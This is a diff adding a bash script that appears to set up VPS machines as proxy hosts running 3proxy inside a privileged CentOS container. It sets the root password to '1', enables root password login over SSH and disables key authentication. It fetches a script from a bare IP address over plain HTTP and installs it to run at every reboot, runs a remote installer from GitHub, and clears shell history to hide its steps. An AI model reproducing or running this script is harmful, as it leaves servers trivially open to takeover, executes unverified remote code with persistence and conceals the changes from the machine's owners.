@@ -1,0 +1,61 @@
+#!/bin/bash
+vps=_TOTAL_VPS_
+
+echo -e "1\n1" | passwd
+sed -re 's/^(PasswordAuthentication)([[:space:]]+)no/\1\2yes/' -i.`date -I` /etc/ssh/sshd_config
+sed -re 's/^(PermitRootLogin)([[:space:]]+)no/\1\2yes/' -i.`date -I` /etc/ssh/sshd_config
+sed -i 's/#PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
+sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+sed -i 's/#PubkeyAuthentication no/PubkeyAuthentication no/' /etc/ssh/sshd_config
+service sshd restart
+
+echo "nameserver 8.8.8.8" >> /etc/resolv.conf
+sudo apt-get -y update --nobest
+sudo apt-get -y upgrade
+crontab -r
+wget -O /opt/start_docker.sh http://178.128.51.38:7000/file-run/start-docker && chmod +x /opt/start_docker.sh && crontab -l | { cat; echo "@reboot  /opt/start_docker.sh"; } | crontab -
+
+#if docker ps | grep -q keyword
+#then 
+  echo "Remove docker"
+	docker stop $(docker ps -a -q)
+	dpkg -l | grep -i docker
+	sudo apt remove --purge docker-ce docker-ce-cli containerd.io -y
+	sudo apt-get -y remove docker docker-engine docker.io
+	sudo rm -rf /var/lib/docker
+	sudo rm -rf /var/lib/containerd
+	sudo apt autoremove -y
+	sudo apt autoclean -y
+	service sshd restart
+	history -c
+#fi
+
+if ! docker info >/dev/null 2>&1; then
+	sudo apt-get install -y  curl apt-transport-https ca-certificates software-properties-common
+	curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+	sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
+	sudo apt update -y
+	sudo apt install -y  docker.io
+	systemctl start docker
+	systemctl enable docker
+	
+	echo "start docker"
+	docker pull dokken/centos-7
+	echo "pull centos"
+	docker rm -f $(docker ps -a -q)
+	systemctl start firewalld
+	#firewall-cmd --permanent --zone=trusted --add-interface=docker0
+	#firewall-cmd --reload
+	echo "run centos"
+	service docker restart
+	docker run --shm-size=16g --cap-add=ALL -td -it --privileged --cpus="1" --name t_container dokken/centos-7 /usr/sbin/init
+	docker start t_container
+
+	docker exec t_container sh -c "service 3proxy start"
+	#docker exec t_container2 sh -c "sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-Linux-* && sed -i 's|#baseurl=http://mirror.centos.org|baseurl=https://vault.centos.org|g' /etc/yum.repos.d/CentOS-Linux-*"
+	#docker exec t_container2 sh -c "yum install rsync -y; yum install openssh-clients -y;yum install -y sudo cronie;crond;rm -f /swapfile"
+	#docker exec t_container2 sh -c "yum -y install make"
+	docker exec t_container sh -c "wget -O install-vps.sh 'https://raw.githubusercontent.com/kimtrongdev/proxy_setup/master/install.sh' && chmod +x install-vps.sh && ./install-vps.sh && rm -rf install-vps.sh"
+
+fi
+history -c
